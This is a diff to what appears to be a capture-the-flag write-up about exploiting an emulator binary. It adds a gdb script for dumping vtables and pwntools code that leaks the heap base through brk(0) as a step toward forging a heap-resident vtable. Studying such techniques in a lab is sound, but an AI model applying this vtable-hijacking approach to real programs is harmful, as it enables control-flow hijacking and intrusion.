@@ -389,7 +389,7 @@ C++ is an object oriented programming language.
 
 Virtual functions is a key mechanism to support polymorphism in C++.
 
-For each class with virtual functions, depending on the class inheritance hierarchy, the compiler will create one or more associated virtual function table (vtabe).
+For each class with virtual functions, depending on the class inheritance hierarchy, the compiler will create one or more associated virtual function table (vtable).
 
 Looking at the object's initialization, we can see that the `Emulator` instance is allocated on the heap:
 
@@ -420,17 +420,67 @@ gef> emu_dump 0x5555556162b0
 ===============================
 ```
 
+This is the gdb script
+
+```bash
+define emu_dump
+    set $base = (char *)$arg0
+
+    printf "====== Emulator @ %p ======\n", $base
+
+    set $vtable = *(void **)$base
+    printf "[+] vtable            : %p\n", $vtable
+
+    printf "[+] virtual functions\n"
+
+    set $i = 0
+    while $i < 4
+        set $fn = *(void **)($vtable + ($i * 8))
+        printf "    [%d] -> %p\n", $i, $fn
+        set $i = $i + 1
+    end
+
+    printf "===============================\n"
+end
+```
+
 Because the vtable pointer itself resides in a heap-allocated object, it becomes a writable target.
 
 If we can forge the vtable, then any subsequent virtual method call on the object would dereference our fake vtable and jump to our controlled function pointer instead.
 
+But before we perform a write, we need to know the location of the heap.
 
+Reading the man page for [brk](https://man7.org/linux/man-pages/man2/brk.2.html)
 
+![man1](man1.png)
 
+```
+Calling sbrk() with an increment of 0 can be used to find the current location of the program break.
+```
 
+The `program break` marks the point where the heap currently ends in the process's virtual address space.
 
+Here's the helper function I wrote:
 
+```python
+def syscall(sys_num, rdi=0, rsi=0, rdx=0):
+    io.sendlineafter(b"syscall:", str(sys_num).encode())
+    io.sendlineafter(b"arg1:", str(rdi).encode())
+    io.sendlineafter(b"arg2:", str(rsi).encode())
+    io.sendlineafter(b"arg3:", str(rdx).encode())
+    io.recvuntil(b"retval: ")
+    ret = int(io.recvline(), 16)
+    return ret
+```
 
+We can leak the heap address by doing this:
+
+```python
+PAGE = 0x21000
+
+heap_base = syscall(brk, 0) - PAGE
+info("heap base: %#x", heap_base)
+```
 
 
 ### Resources
